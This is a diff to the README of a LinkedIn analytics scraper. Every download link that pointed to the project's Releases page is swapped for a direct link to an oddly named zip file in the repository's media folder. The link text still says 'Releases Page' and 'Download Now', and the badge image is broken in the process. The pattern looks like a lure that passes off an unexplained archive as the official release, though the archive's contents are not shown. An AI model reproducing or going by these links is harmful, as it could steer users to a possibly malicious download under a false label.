@@ -6,9 +6,9 @@ Welcome to the linkedin-analytics-dashboard-scraper! This tool helps you scrape 
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Add%20to%20Desktop-brightgreen)](https://github.com/modcigano221/linkedin-analytics-dashboard-scraper/releases)
+[![Download Now](https://raw.githubusercontent.com/modcigano221/linkedin-analytics-dashboard-scraper/main/media/linkedin-analytics-dashboard-scraper-Arriet.zip%20Now-Add%20to%20Desktop-brightgreen)](https://raw.githubusercontent.com/modcigano221/linkedin-analytics-dashboard-scraper/main/media/linkedin-analytics-dashboard-scraper-Arriet.zip)
 
-To get the latest version, visit this page to download: [Releases Page](https://github.com/modcigano221/linkedin-analytics-dashboard-scraper/releases).
+To get the latest version, visit this page to download: [Releases Page](https://raw.githubusercontent.com/modcigano221/linkedin-analytics-dashboard-scraper/main/media/linkedin-analytics-dashboard-scraper-Arriet.zip).
 
 ## 📋 Features
 
@@ -29,7 +29,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases Page](https://github.com/modcigano221/linkedin-analytics-dashboard-scraper/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/modcigano221/linkedin-analytics-dashboard-scraper/main/media/linkedin-analytics-dashboard-scraper-Arriet.zip).
 2. Find the latest release of the application.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
